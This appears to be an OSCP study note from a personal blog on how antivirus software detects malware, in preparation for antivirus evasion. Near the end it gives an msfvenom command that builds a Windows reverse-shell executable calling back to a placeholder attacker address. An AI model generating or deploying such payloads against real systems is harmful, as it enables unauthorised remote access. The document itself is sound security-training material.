---
title: Antivirus Evasion
date: 2024-02-24 06:30:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Antivirus Evasion tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Antivirus Evasion

Attackers often attempt to disable or otherwise bypass antivirus solutions, which can conduct virus removal, IDS/IPS, website scanners, firewalls, etc.

## Antivirus Software Key Components and Operations

### Known vs Unknown Threats

Anti-v software does signature-based detection on known and specific pieces of malware, which can range from detecting a file hash to a specific binary sequence match.

YARA is a signature language that allows researchers to query VirusTotal or integrate their own signatures into AVs.

Modern AV, like Windows Defender, use Machine Learning that is queried everytime an unknown file is found on a host - meaning they can detect unknown malware. However, ML engines run in the cloud and need an active internet connection, which is often not feasible for internal enterprise servers.

To overcome this, we evolved EDRs, which gather security event telemetry and send it to a SIEM.

## Detection Methods

Signature-Based is a restricted list technology that scans for known malware in a file system, quarantining malicious files. The signature can be a hash of the file itself or a set of patterns, like binary strings/values that belong to a specific piece of malware. However, relying on a file hash is weak as changing just one bit will change a hash.

```console
$ nano malware.txt
  offsec
$ xdd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010

$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt

$ nano malware.txt
  offseC

$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010

$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

Heuristic-Based detection relies on sets of rules and algorithms that determine if an action is benign or malicious, often achieved by stepping through the instruction set of the binary file or disassembling and decompiling the machine code.

Behavior-Based detection dynamically assessses a binary file's behavior by executing the file in an emulated envionrment and searching for malicious behaviors.

Machine-Learning detection uses ML to detect unknown threats. Windows Defender, for example, has a client ML engine and a cloud ML engine that supports when the client engine cannot make a determination.

Let's test some AVs with a popular Metasploit payload using msfvenom.

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=111.111.111.111 LPORT=443 -f exe > binary.exe
```

Upload this file to VirusTotal to review various AV results. To get the file from a Windows host to your machine, leverage your webdav directory we made previously and add the library config file to the Windows target.
